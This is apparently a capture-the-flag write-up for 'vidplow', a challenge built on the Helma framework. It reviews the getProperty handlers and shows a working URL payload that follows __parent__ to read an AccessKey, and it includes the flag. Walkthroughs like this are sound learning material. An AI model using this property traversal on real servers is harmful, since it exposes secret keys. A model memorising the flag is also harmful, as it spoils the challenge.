---
tags: 
references:
---
# vidplow
Solves: 
Tags: 
## Description
> We recently stumbled upon an exposed SVN server of a large multimedia corporation, containing some of the code of their backend applications and internal tooling. However, the access keys seem to not be the ones used in production - the real ones should fetch us quite a high price though, if we manage to get our hands on them that is. Just one problem - the tech stack seems to be really obscure, and no one on our team has any clue what the heck is even going on. Can you take a look, and maybe find some vulnerabilities in this thing?
## Overview
It's a static website made with [Helma](https://github.com/helma-org/helma?tab=readme-ov-file)
## Road to flag
The flag is in `app.properties`
## Code review
types
```
# category
name
description

# property
obj
name

# video
name
producer
year
description
```

handlers
```js
// video
function getProperty(name) {
    if (name == "category") {
        return this._parent;
    } else {
        return this[name];
    }
}

// property
function getProperty(name) {
    var prop = this.obj.getProperty(this.name);
    if (prop && prop.getProperty) {
        return prop.getProperty(name);
    } else {
        return null;
    }
}

// category
function getProperty(name) {
    if (name == "name") {
        return this.name;
    } else if (name == "description") {
        return this.description;
    } else if (name == "parent") {
        return this._parent;
    } else {
        return null;
    }
}
```

`edit.hac`
```
res.data.value = this.obj.getProperty(this.name);
res.data.body = this.renderSkinAsString("edit");
this.renderSkin("page");
```
## Exploitation
JS scope chain: http://dmitrysoshnikov.com/ecmascript/javascript-the-core/#scope-chain

`https://3ndbdvaok1gxhfxa.dyn.acsc.land/Documentary/Corporate+Wars%3A+Behind+the+Curtain/__parent__/AccessKey`

`dach2025{wh0_n33ds_n0de_j5_anyw4y_wges1dkzxfzp1cn9}`